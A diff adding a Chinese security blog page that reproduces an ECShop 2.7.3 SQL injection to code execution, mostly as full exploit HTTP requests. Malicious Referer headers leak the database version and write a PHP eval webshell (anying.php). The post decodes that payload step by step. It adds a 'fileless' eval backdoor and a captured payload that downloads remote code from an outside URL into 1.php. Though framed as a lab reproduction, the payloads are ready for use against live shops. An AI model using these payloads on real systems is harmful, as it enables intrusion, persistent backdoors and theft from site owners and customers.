@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="环境Windows + phptudy php5.3.29
+程序ECShop_V2.7.3
+参考文章：https://paper.tuisec.win/detail/fb4cd06629c2537https://paper.tuisec.win/detail/31d2cbe474bfe5chttp:">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="secCode">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="ECShop_V2.7.3注入代码执行漏洞复现"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="代码审计漏洞实例深度剖析"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>ECShop_V2.7.3注入代码执行漏洞复现 - 代码审计漏洞实例深度剖析</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="代码审计漏洞实例深度剖析">
+            <img src="http://anying.nos-eastchina1.126.net/logo.png" class="dib h3" alt="代码审计漏洞实例深度剖析">
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/" 
+                    title="首页">
+                    首页
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/Thank.html" 
+                    title="感谢">
+                    感谢
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/Train.html" 
+                    title="培训">
+                    培训
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" 
+                    href="/about.html" 
+                    title="关于">
+                    关于
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">ECShop_V2.7.3注入代码执行漏洞复现</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-09-30</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-file-text-o"></i>
+    </div>
+</div>
+
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+
+                    <!-- Main Post Content -->
+                    <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Windows + phptudy php5.3.29</p>
+<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>ECShop_V2.7.3</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://paper.tuisec.win/detail/fb4cd06629c2537" target="_blank" rel="noopener">https://paper.tuisec.win/detail/fb4cd06629c2537</a><br><a href="https://paper.tuisec.win/detail/31d2cbe474bfe5c" target="_blank" rel="noopener">https://paper.tuisec.win/detail/31d2cbe474bfe5c</a><br><a href="http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" target="_blank" rel="noopener">http://ringk3y.com/2018/08/31/ecshop2-x%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a> （漏洞发现者）</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="sql注入payload"><a href="#sql注入payload" class="headerlink" title="sql注入payload:"></a>sql注入payload:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=login HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+<p>重要的是这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br><span class="line">![1](http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%871.png &quot;1&quot;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="写shell-payload"><a href="#写shell-payload" class="headerlink" title="写shell payload:"></a>写shell payload:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /upload//user.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: bdshare_firstime=1536157227763; PHPSESSID=ebcfdf668f83451414e85cac992019ec; ECS_ID=e55a0e8ba5f60179e5a568c65cb7218ed17f3fcd; ECS[visit_times]=1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:306:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果生成不出来，拦截user.php包并且在“Connection: keep-alive”后面敲回车再加上Referer:<br><img src="http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%872.png" alt="2" title="2"><br>就会生成anying.php 内容为&lt;?php eval($_POST[anying]); ?&gt;’)<br><img src="http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%873.png" alt="3" title="3"></p>
+<p>我们看看payload这么构造的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:306:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>提取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a</span><br></pre></td></tr></table></figure></p>
+<p>省略0x<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a</span><br></pre></td></tr></table></figure></p>
+<p>ASCII Hex解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;$asd&apos;];assert(base64_decode(&apos;ZmlsZV9wdXRfY29udGVudHMoJ2FueWluZy5waHAnLCc8P3BocCBldmFsKCRfUE9TVFthbnlpbmddKTsgPz4nKQ==&apos;));//&#125;xxx</span><br></pre></td></tr></table></figure></p>
+<p>提取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmlsZV9wdXRfY29udGVudHMoJ2FueWluZy5waHAnLCc8P3BocCBldmFsKCRfUE9TVFthbnlpbmddKTsgPz4nKQ==</span><br></pre></td></tr></table></figure></p>
+<p>BESA64解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&apos;anying.php&apos;,&apos;&lt;?php eval($_POST[anying]); ?&gt;&apos;)</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%874.png" alt="4" title="4"></p>
+<p>将构造好的 payload序列化生成一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%875.png" alt="5" title="5"><br>变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:306:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a32467565576c755a7935776148416e4c4363385033426f6343426c646d46734b4352665545395456467468626e6c70626d64644b547367507a346e4b513d3d2729293b2f2f7d7878780a,10-- -&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>两个比较屌的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: http://www.noxxx.com/554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:2:&quot;id&quot;;s:3:&quot;&apos;/*&quot;;s:3:&quot;num&quot;;S:216:&quot;*/UNION select 1,0x272f2a,3,4,5,6,7,8,0x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d,10#&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p>
+<p>base64部分的内容是<br>@EVAL(base64_decode($_POST[‘Nox’]));<br>可以看到，没有写入 webshell，而是直接接收$_POST[‘Nox’]参数，进行base64解码后直接传入eval函数执行代码，相当于一个无文件的 webshell ，非常隐蔽。<br><img src="http://anying.nos-eastchina1.126.net/ec%E5%9B%BE%E7%89%876.png" alt="6" title="6"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:3:&#123;s:3:&quot;num&quot;;s:314:&quot;/&lt;SP&gt;union&lt;SP&gt;select&lt;SP&gt;1,0x272f2a,3,4,5,6,7,8,0x7B247B24686F6D65275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A7A4575634768774A79786D6157786C5832646C6446396A623235305A5735306379676E6148523063446F764C33566C5A5335745A53394E636B706A4A796B704F773D3D2729293B2F2F7D7D,10--&lt;SP&gt;-&quot;;s:2:&quot;id&quot;;s:3:&quot;&apos;/&quot;;s:4:&quot;name&quot;;s:3:&quot;ads&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure></p>
+<p>// file_put_contents(‘1.php’,file_get_contents(‘<a href="http://uee.me/MrJc&#39;))" target="_blank" rel="noopener">http://uee.me/MrJc&#39;))</a>;<br>和这篇分析文章里捕获到的样本一致。</p>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+
+                    <!-- Comments -->
+                    
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="http://tachyons.io/img/avatar_1.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="secCode">
+        </div>
+        <div class="dtc db-l v-mid lh-copy measure center f6 black-50 tj">
+            代码审计漏洞实例深度剖析带你走进另一个安全世界。
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5" />
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2018/09/30/ECShop_V2.7.3 sql/">ECShop_V2.7.3注入代码执行漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/29/CVE-2015-8562/">Joomla 3.4.5 反序列化漏洞复现（CVE-2015-8562）</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/28/DedeCMS V5.7 SP2_tpl.php/">DedeCMS V5.7 SP2版本tpl.php存在代码执行漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/22/Z-BLOG Blind-XXE/">Z-BLOG Blind-XXE造成任意文件读取漏洞复现</a>
+        </p>
+    
+        <p>
+            <a href="/2018/09/20/ThinkPHP3.2_SQL_Injection(2018-08-23)/">ThinkPHP3.2 框架sql注入漏洞(2018-08-23)</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://twitter.com/?lang=en" target="_blank">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://www.facebook.com/" target="_blank">
+                            <i class="fa fa-facebook"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://dribbble.com/" target="_blank">
+                            <i class="fa fa-dribbble"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/klugjo/hexo-theme-anodyne" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://plus.google.com/" target="_blank">
+                            <i class="fa fa-google-plus"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://www.behance.net/" target="_blank">
+                            <i class="fa fa-behance"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://500px.com/" target="_blank">
+                            <i class="fa fa-500px"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="mailto:test@example.com" target="_blank">
+                            <i class="fa fa-envelope"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="/#" target="_blank">
+                            <i class="fa fa-rss"></i>
+                        </a>
+                    </div>
+                
+            </div>
+            <div class="f6 f5-ns center tc white pt5 fw3">
+                @Untitled. All right reserved | Design & Hexo <a class="link dim white" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
